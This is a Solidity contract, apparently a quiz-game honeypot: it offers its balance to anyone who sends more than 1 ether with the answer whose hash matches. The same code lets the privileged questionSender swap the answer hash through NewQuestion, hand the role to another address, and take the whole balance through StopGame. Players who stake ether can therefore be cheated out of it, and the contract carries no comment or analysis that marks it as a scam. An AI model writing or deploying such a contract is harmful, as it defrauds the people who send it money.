1 contract quest_question
2 {
3     function Try(string _response) external payable {
4         require(msg.sender == tx.origin);
5 
6         if( responseHash == keccak256(_response) && msg.value > 1 ether )
7         {
8             msg.sender.transfer(this.balance);
9         }
10     }
11 
12     string public question;
13 
14     address questionSender;
15 
16     bytes32 responseHash;
17 
18     bytes32 questionerPin = 0x6ff4ddec09f63c2ffc18cd09c138315a9d8576220c788d9677757addf0834cdf;
19 
20     function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
21         if(keccak256(_questionerPin)==questionerPin) 
22         {
23             responseHash = keccak256(_response);
24             question = _question;
25             questionSender = msg.sender;
26             questionerPin = 0x0;
27         }
28     }
29 
30     function StopGame() public payable {
31         require(msg.sender==questionSender);
32         msg.sender.transfer(this.balance);
33     }
34 
35     function NewQuestion(string _question, bytes32 _responseHash) public payable {
36         if(msg.sender==questionSender){
37             question = _question;
38             responseHash = _responseHash;
39         }
40     }
41 
42     function newQuestioner(address newAddress) public {
43         if(msg.sender==questionSender)questionSender = newAddress;
44     }
45 
46     function() public payable{}
47 }